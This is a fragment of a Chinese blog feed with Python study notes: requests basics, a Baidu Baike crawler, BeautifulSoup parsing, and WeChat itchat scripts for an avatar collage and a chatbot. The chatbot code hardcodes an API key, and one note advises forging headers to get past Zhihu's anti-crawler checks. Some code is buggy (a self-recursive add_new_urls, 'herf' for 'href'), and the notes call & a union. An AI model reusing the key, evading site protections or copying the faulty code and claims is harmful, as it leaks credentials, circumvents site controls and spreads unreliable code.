class="line">301</span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>如果你使用了 HEAD，你也可以启用重定向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r &#x3D; requests.head(&#39;http:&#x2F;&#x2F;github.com&#39;, allow_redirects&#x3D;True)</span><br><span class="line">&gt;&gt;&gt; r.url</span><br><span class="line">&#39;https:&#x2F;&#x2F;github.com&#x2F;&#39;</span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[&lt;Response [301]&gt;]</span><br></pre></td></tr></table></figure><h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><p>你可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; requests.get(&#39;http:&#x2F;&#x2F;github.com&#39;, timeout&#x3D;0.001)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host&#x3D;&#39;github.com&#39;, port&#x3D;80): Request timed out. (timeout&#x3D;0.001)</span><br></pre></td></tr></table></figure><p>注意<br>timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</p><h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><p>遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 ConnectionError 异常。<br>如果 HTTP 请求返回了不成功的状态码， Response.raise_for_status() 会抛出一个 HTTPError 异常。<br>若请求超时，则抛出一个 Timeout 异常。<br>若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。<br>所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;发送请求&quot;&gt;&lt;a href=&quot;#发送请求&quot; class=&quot;headerlink&quot; title=&quot;发送请求&quot;&gt;&lt;/a&gt;发送请求&lt;/h2&gt;&lt;p&gt;使用 Requests 发送网络请求非常简单。&lt;br&gt;一开始要导入 Requests 模块：&lt;/p&gt;
&lt;figure cla
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="python" scheme="http://yoursite.com/child/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫学习1</title>
    <link href="http://yoursite.com/child/2021/01/07/python-%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/child/2021/01/07/python-爬虫学习/</id>
    <published>2021-01-07T08:10:09.404Z</published>
    <updated>2018-03-25T09:45:37.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol><li><p>最先肯定要复习一下正则不定式，当然还可以用XPath语言去替代正则    <a href="http://www.w3school.com.cn/xpath/">教程</a><br><img src="http://ww2.sinaimg.cn/large/0060lm7Tly1fpp72zcmssj30m71br7wh.jpg" alt="image"></p></li><li><p>爬虫调度端：启动爬虫，停止爬虫，监视爬虫运行情况<br>URL管理器：对将要爬取的和已经爬取过的URL进行管理；可取出带爬取的URL，将其传送给“网页下载器”<br>网页下载器：将URL指定的网页下载，存储成一个字符串，在传送给“网页解析器”<br>网页解析器：解析网页可解析出①有价值的数据②另一方面，每个网页都包含有指向其他网页的URL，解析出来后可补充进“URL管理器”<br><img src="http://ww2.sinaimg.cn/large/0060lm7Tly1fpp7cbw9z7j30vx0gkdkr.jpg" alt="image"><br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7cs0ajqj30vv0i2gtv.jpg" alt="image"></p></li></ol><ol start="3"><li>URL管理器的实现方式有三种，一种是python内存中，利用set（）函数储存url<br>第二种是关联   第三种就是存放在缓存数据库中，如redis（这个不太明白 ）  </li><li>常见的网页下载器，官方的是urllib2，在py3.x后被改为urllib.request，支持登录网页的cookies处理以及代理处理），使用from urllib import <h2 id="request添加模块"><a href="#request添加模块" class="headerlink" title="request添加模块"></a>request添加模块</h2></li><li>基本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8  #当文件中有中文时，需要声明字符集  </span><br><span class="line">import urllib2  </span><br><span class="line">import cookielib  </span><br><span class="line">#引用urllib2、cookielib模块</span><br><span class="line">url&#x3D;&#39;https:&#x2F;&#x2F;www.zhihu.com&#39;</span><br><span class="line">cj&#x3D;cookielib.CookieJar()</span><br><span class="line">#将查询数据赋值给变量</span><br><span class="line">opener&#x3D;urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">#向urllib2模块添加opener</span><br><span class="line">request&#x3D;urllib2.Request(url)</span><br><span class="line">request.add_header(&#39;user-agent&#39;,&#39;Mozilla&#x2F;5.0&#39;)</span><br><span class="line">response1&#x3D;urllib2.urlopen(url)</span><br><span class="line">print response1.getcode()</span><br><span class="line">print cj</span><br><span class="line">print response1.read()</span><br></pre></td></tr></table></figure></li><li>基本的urlopen()函数不支持验证、cookie或其他HTTP高级功能。要支持这些功能，必须使用build_opener()函数来创建自己的自定义Opener对象  </li><li>网页解析器常用beatuifulsoup模块进行解析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import urllib2</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url&#x3D;&#39;https:&#x2F;&#x2F;www.zhihu.com&#39;</span><br><span class="line">request&#x3D;urllib2.Request(url)</span><br><span class="line">response1&#x3D;urllib2.urlopen(url)</span><br><span class="line">soup&#x3D;BeautifulSoup(response1.read(),&#39;html.parser&#39;,from_encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">#第一个参数是解析出网页的代码，第二个是解析方式，第三个是用的字符集</span><br><span class="line">links&#x3D;soup.find_all(&#39;a&#39;)</span><br><span class="line">for link in links:</span><br><span class="line">    print link.name,link[&#39;href&#39;],link.get_text()</span><br><span class="line">#遍历网页html代码中的a节点，并输出节点的名字、链接、对应文本</span><br><span class="line">print(soup)</span><br></pre></td></tr></table></figure></li><li>通过一个简单爬虫实例来学习  <h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import url_manager,html_downloader,html_parser,html_outputer</span><br><span class="line">class SpiderMain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.urls&#x3D;url_manager.UrlManeger()</span><br><span class="line">        self.downloader&#x3D;html_downloader.HtmlDownloader()</span><br><span class="line">        self.parser&#x3D;html_parser.HtmlParser()</span><br><span class="line">        self.outputer&#x3D;html_outputer.HtmlOutputer()</span><br><span class="line">        #初始化管理器、下载器、解析器、输出器</span><br><span class="line">    def craw(self,root_url):</span><br><span class="line">        count&#x3D;1#记录爬取的次数</span><br><span class="line">        self.urls.add_new_url(root_url)</span><br><span class="line">        while self.urls.has_new_url():#如果有新的url</span><br><span class="line">            try:</span><br><span class="line">                new_url&#x3D;self.urls.get_new_url() #放进一个新的url</span><br><span class="line">                print &#39;craw %d:%s&#39;%(count,new_url)</span><br><span class="line">                html_cont&#x3D;self.downloader.download(new_url)#下载新url对应的页面</span><br><span class="line">                new_urls,new_data&#x3D;self.parser.parser(new_url,html_cont)#对新的url进行代码解析，又得到新的url和有效数据</span><br><span class="line">                self.urls.add_new_urls(new_urls)#将得到的新的url加入到url管理器进行爬取</span><br><span class="line">                self.outputer.collect_data(new_data)#收集有效的数据</span><br><span class="line">                if count&#x3D;&#x3D;1000:#设置查找到1000个url结束爬取</span><br><span class="line">                    break</span><br><span class="line">                count&#x3D;count+1</span><br><span class="line">            except:</span><br><span class="line">                print &#39;craw failed&#39;#标记url爬取失败</span><br><span class="line">        self.outputer.output_html()#输出为html形式</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    root_url&#x3D;&quot;https:&#x2F;&#x2F;baike.baidu.com&#x2F;item&#x2F;Python&quot;#设置爬虫的入口url</span><br><span class="line">    obj_spider&#x3D;SpiderMain()</span><br><span class="line">    obj_spider.craw(root_url)#启动爬虫</span><br></pre></td></tr></table></figure><h5 id="管理器"><a href="#管理器" class="headerlink" title="管理器"></a>管理器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">class UrlManeger(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.new_urls&#x3D;set()#将新的url输出为一个集合并且删除重复元素</span><br><span class="line">        self.old_urls&#x3D;set()#将新的url输出为一个集合并且删除重复元素</span><br><span class="line"></span><br><span class="line">    def add_new_url(self, url):#向管理器中添加一个新的url</span><br><span class="line">        if url is None: #判断url是否存在</span><br><span class="line">            return</span><br><span class="line">        if url not in self.new_urls and url not in self.old_urls: #判断url是否在待爬取或已爬取页面</span><br><span class="line">            self.new_urls.add(url)#将url添加到未爬取列表</span><br><span class="line"></span><br><span class="line">    def add_new_urls(self, new_urls):#向管理器中添加批量url</span><br><span class="line">        if new_urls is None or len(new_urls) &#x3D;&#x3D; 0:</span><br><span class="line">            return</span><br><span class="line">        for url in new_urls:#从urls中遍历url添加到URL集合中</span><br><span class="line">            self.add_new_urls(url)</span><br><span class="line"></span><br><span class="line">    def has_new_url(self):#验证是否添加新的url</span><br><span class="line">        return len(self.new_urls) !&#x3D; 0</span><br><span class="line"></span><br><span class="line">    def get_new_url(self):#从管理器中拿出一个新的url进行爬取</span><br><span class="line">        new_url&#x3D;self.new_urls.pop()#新的url集合中随机取出一个url并且从集合中删去这个url</span><br><span class="line">        self.old_urls.add(new_url)</span><br><span class="line">        return new_url</span><br></pre></td></tr></table></figure><h5 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">class HtmlParser(object):</span><br><span class="line">    def _get_new_urls(self, page_url, soup):</span><br><span class="line">        new_urls&#x3D;set()</span><br><span class="line">        links&#x3D;soup.find_all(&#39;a&#39;, href&#x3D;re.compile(r&#39;&#x2F;item&#x2F;&#39;))#正则匹配，查询a标签中href属性</span><br><span class="line">        for link in links:#遍历links列表（匹配的url片段）</span><br><span class="line">            new_url&#x3D;link[&#39;herf&#39;]#抓取herf属性值（link被储存为字典，用[]取出数据）</span><br><span class="line">            new_full_url&#x3D;urlparse.urljoin(page_url,new_url)#将url拼接起来</span><br><span class="line">            new_urls.add(new_full_url)#将补全的url加入未爬取url名单</span><br><span class="line">        return new_urls</span><br><span class="line"></span><br><span class="line">    def _get_new_data(self, page_url, soup):</span><br><span class="line">        res_data&#x3D;&#123;&#125;#建立一个res_data字典</span><br><span class="line">        res_data[&#39;url&#39;]&#x3D;page_url#加入url</span><br><span class="line">        title_node&#x3D;soup.find(&#39;dd&#39;, class_&#x3D;&quot;lemmaWgt-lemmaTitle-title&quot;).find(&quot;h1&quot;)#抓取dd标签class属性的hi属性</span><br><span class="line">        res_data[&#39;title&#39;]&#x3D;title_node.get_text()#取得h1标签文本</span><br><span class="line">        sammary_node&#x3D;soup.find(&#39;div&#39;, class_&#x3D;&quot;lemma-summary&quot;)</span><br><span class="line">        res_data[&#39;sammary&#39;]&#x3D;sammary_node.get_text()</span><br><span class="line">        return res_data#输出字典</span><br><span class="line"></span><br><span class="line">    def parser(self, new_url, html_cont):</span><br><span class="line">        if new_url is None or html_cont is None:#判断页面是否存在</span><br><span class="line">            return</span><br><span class="line">        soup&#x3D;BeautifulSoup(html_cont, &#39;html_parser&#39;,from_encoding&#x3D;&#39;utf-8&#39;)#以utf-8字符集解析页面html代码</span><br><span class="line">        new_urls&#x3D;self._get_new_urls(new_url, soup)</span><br><span class="line">        new_data&#x3D;self._get_new_data(new_url, soup)</span><br><span class="line">        return new_urls, new_data</span><br></pre></td></tr></table></figure><h5 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#这里只使用了最简单的方法</span><br><span class="line">import urllib2#载入urllib2模块</span><br><span class="line"></span><br><span class="line">class HtmlDownloader(object):</span><br><span class="line">    def download(self, url):</span><br><span class="line">        if url is None:#验证url是否存在</span><br><span class="line">            return None</span><br><span class="line">        response&#x3D;urllib2.urlopen(url)#下载url</span><br><span class="line">        if response.getcode() !&#x3D; 200:#判断状态码</span><br><span class="line">            return None</span><br><span class="line">        res&#x3D;response.read()</span><br><span class="line">        return res#读取网页内容</span><br></pre></td></tr></table></figure><h5 id="输出器"><a href="#输出器" class="headerlink" title="输出器"></a>输出器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">class HtmlOutputer(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.datas&#x3D;[]#设置data为一个列表</span><br><span class="line">    def collect_data(self,data):</span><br><span class="line">        if data is None:</span><br><span class="line">            return</span><br><span class="line">        self.datas.append(data)</span><br><span class="line"></span><br><span class="line">    def output_html(self):</span><br><span class="line">        fout&#x3D;open(&#39;output.html&#39;,&#39;w&#39;)#写出一个html文件</span><br><span class="line">        fout.write(&#39;&lt;html&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;meta charset&#x3D;\&#39;utf-8\&#39;&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;body&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;table&gt;&#39;)</span><br><span class="line">        for data in self.datas:</span><br><span class="line">            fout.write(&#39;&lt;tr&gt;&#39;)</span><br><span class="line">            fout.write(&#39;&lt;td&gt;%s&lt;&#x2F;td&gt;&#39;%data[&#39;url&#39;])</span><br><span class="line">            fout.write(&#39;&lt;td&gt;%s&lt;&#x2F;td&gt;&#39;%data[&#39;title&#39;].encode(&#39;utf-8&#39;))</span><br><span class="line">            fout.write(&#39;&lt;td&gt;%s&lt;&#x2F;td&gt;&#39;%data[&#39;sammary&#39;].encode(&#39;utf-8&#39;))</span><br><span class="line">            fout.write(&#39;&lt;&#x2F;tr&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;&#x2F;table&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;&#x2F;body&gt;&#39;)</span><br><span class="line">        fout.write(&#39;&lt;&#x2F;html&gt;&#39;)</span><br><span class="line">        fout.close()</span><br></pre></td></tr></table></figure>这个爬取百度百科的模块是按照控制器、URL管理器、下载器、解析器、输出器分开编写的  </li><li>最常用的是“.text”和”.content”，前者输出unicode，后者输出二进制   </li><li>这是PIL模块中resize函数（重新设置图片尺寸）resize((size, size), Image.ANTIALIAS）图片质量的参数<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7dtrugdj30mv06jmxb.jpg" alt="image"></li><li>某些网站如知乎，存在反爬虫机制，如果要成功加载页面需要伪造头文件</li><li>照着网上的教程，熟悉一下itchat模块，做微信头像拼图的代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import itchat</span><br><span class="line">import os</span><br><span class="line">from math import sqrt</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">itchat.auto_login()#微信登录接口</span><br><span class="line">for friend in itchat.get_friends(update&#x3D;True)[0:]:#获取好友列表，并保持更新</span><br><span class="line">    print friend[&#39;NickName&#39;], friend[&#39;RemarkName&#39;], friend[&#39;Sex&#39;], friend[&#39;Province&#39;], friend[&#39;Signature&#39;]#输出好友的基本信息</span><br><span class="line">    img &#x3D; itchat.get_head_img(userName&#x3D;friend[&quot;UserName&quot;])#获取好友头像</span><br><span class="line">    path&#x3D;&quot;C:\\Users\\14564\\Pictures\\pachong\\&quot;+friend[&#39;NickName&#39;]+&#39;(&#39;+friend[&#39;RemarkName&#39;]+&#39;).jpg&#39;#保存获取的头像</span><br><span class="line">    try:</span><br><span class="line">        with open(path,&#39;wb&#39;) as f:</span><br><span class="line">            f.write(img)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print repr(e)</span><br><span class="line"></span><br><span class="line">def pt():</span><br><span class="line">    path2&#x3D;&quot;C:\\Users\\14564\\Pictures\\pachong\\&quot;</span><br><span class="line">    pList&#x3D;[]</span><br><span class="line">    for item in os.listdir(path2):#遍历出单个头像</span><br><span class="line">        imgPath&#x3D;os.path.join(path2,item)</span><br><span class="line">        pList.append(imgPath)#将头像图片保存到字典中</span><br><span class="line">    total&#x3D;len(pList)#计算图片个数</span><br><span class="line">    line&#x3D;int(sqrt(total))#计算合成图片边长</span><br><span class="line">    NewImage&#x3D;Image.new(&#39;RGB&#39;,(128*line,128*line))#创建一个新的底片存放大小为128px的所有头像</span><br><span class="line">    x&#x3D;0</span><br><span class="line">    y&#x3D;0</span><br><span class="line">    for item in pList:</span><br><span class="line">        try:</span><br><span class="line">            Img&#x3D;Image.open(item)</span><br><span class="line">            Img&#x3D;Img.resize((128,128),Image.ANTIALIAS)#将头像图片改变大小</span><br><span class="line">            NewImage.paste(Img,(x*128,y*128))#不断添加头像</span><br><span class="line">            x+&#x3D;1</span><br><span class="line">        except IOError:</span><br><span class="line">            print &quot;第%d行，%d列文件读取失败！IOError：%s&quot;%(y,x,item)</span><br><span class="line">            x-&#x3D;1</span><br><span class="line">        if x&#x3D;&#x3D;line:#将一行填完后移动到下一行</span><br><span class="line">            x&#x3D;0</span><br><span class="line">            y+&#x3D;1</span><br><span class="line">        if (x+line*y)&#x3D;&#x3D;line*line:#判断</span><br><span class="line">            break</span><br><span class="line">    NewImage.save(path2+&#39;final.jpg&#39;)#保存为final.jpg</span><br><span class="line">pt()</span><br><span class="line">itchat.run()</span><br><span class="line">8.一个关于微信聊天机器人的程序</span><br><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import itchat, time, re</span><br><span class="line">from itchat.content import *</span><br><span class="line">import urllib2, urllib</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT])#向注册方法传入msg包含text文本消息内容，这里的@是一个装饰器</span><br><span class="line">def text_reply(msg):</span><br><span class="line">    info&#x3D;msg[&#39;Text&#39;].encode(&#39;UTF-8&#39;)#将得到的消息存放在info变量中</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;wwww.tuling123.com&#x2F;openapi&#x2F;api&#39;#链接到图灵机器人api</span><br><span class="line">    data&#x3D;&#123;u&quot;key&quot;:&quot;f0fa6a1ec8c542aeaa606a14b2ee8ecd&quot;,&quot;info&quot;:info&#125;#post传入参数</span><br><span class="line">    data&#x3D;urllib.urlencode(data)</span><br><span class="line">    url2&#x3D;urllib2.Request(url,data)</span><br><span class="line"></span><br><span class="line">    response&#x3D; urllib2.urlopen(url2)</span><br><span class="line">    apicontent&#x3D;response.read()</span><br><span class="line">    s&#x3D;json.loads(apicontent,encoding&#x3D;&quot;utf-8&quot;)</span><br><span class="line">    print &#39;s&#x3D;&#x3D;&#39;,s</span><br><span class="line">    if s[&#39;code&#39;]&#x3D;&#x3D;100000:</span><br><span class="line">        itchat.send(s[&#39;text&#39;],msg[&#39;FromUserName&#39;])#将从api得到的json文本发送给好友</span><br><span class="line">itchat.auto_login(hotReload&#x3D;True)#hotReload表示保持登录状态</span><br><span class="line">itchat.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure></li><li>关于requests模块的一些补充<br>常见报错说明<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fpp7aspnr9j315x0f6k3u.jpg" alt="image"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;小猪图片.jpg&#39;,&#39;wb&#39;) as f:</span><br><span class="line">    f.write(r.content)</span><br></pre></td></tr></table></figure>r.content将返回图像的二进制内容，当我们要保存到本地文件时，写入方式必须为“wb”，否则会报错</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;最先肯定要复习一下正则不定式，当然还可以用XPath语言去替代正则    &lt;a href=&quot;http://www.w3sc
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="python" scheme="http://yoursite.com/child/tags/python/"/>
    
      <category term="爬虫" scheme="http://yoursite.com/child/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>python基础学习</title>
    <link href="http://yoursite.com/child/2021/01/07/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/child/2021/01/07/python基础学习/</id>
    <published>2021-01-07T08:10:09.404Z</published>
    <updated>2018-03-23T09:25:01.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h6 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h6><p>print(L[0][0], L[1][1], L[-1][-1], sep=’\n’) 像这样在print里面最后加sep=’\n’可以起到换行的作用，而且换行后面有空格</p><h6 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h6><p>list列表使用[]括起来。其中元素可以删改，tuple元组使用()，其中不可以删改，都可以在其中进行嵌套</p><h6 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h6><p>条件函数if内部代码只需要缩进两行就可以了，不用{}</p><h6 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age &#x3D; 20</span><br><span class="line">if age &gt;&#x3D; 6:</span><br><span class="line">   print(&#39;teenager&#39;)</span><br><span class="line">elif age &gt;&#x3D; 18:</span><br><span class="line">   print(&#39;adult&#39;)</span><br><span class="line">else:</span><br><span class="line">   print(&#39;kid&#39;)</span><br></pre></td></tr></table></figure><p>其中最后结果只会显示teenager，if语句执行有个特点，它是从上往下判断，如果在某个判断上是True，把该判断对应的语句执行后，就忽略掉剩下的elif和else</p><h6 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h6><p>input()函数输入的值作为字符串，不能参加比较，可以用int（）、float（）函数进行转变</p><h6 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h6><p>Python的循环有两种，一种是for…in循环，依次把list或tuple中的每个元素迭代出来  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names &#x3D; [&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;]</span><br><span class="line">for name in names:</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure><p>   第二种循环是while循环，只要条件满足，就不断循环，条件不满足时退出循环。比如我们要计算100以内所有奇数之和，可以用while循环实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum &#x3D; 0</span><br><span class="line">n &#x3D; 99</span><br><span class="line">while n &gt; 0:</span><br><span class="line">    sum &#x3D; sum + n</span><br><span class="line">    n &#x3D; n - 2</span><br><span class="line">print(sum)</span><br></pre></td></tr></table></figure><h6 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h6><p>python中的字典dict与js中的json表达方式极为相似，采用键值对形式表达用{}括起每一个key对应一个value，要删除一个key，用pop(key)方法</p><h6 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h6><p>set相对于dict只有key，相当于一个无序无重复数字的集合，&amp;表示并集，|表示合集，</p><h6 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h6><p>replace()函数只能改变值，不能改变变量，要改变只有重新定义变量</p><figure class="highlight 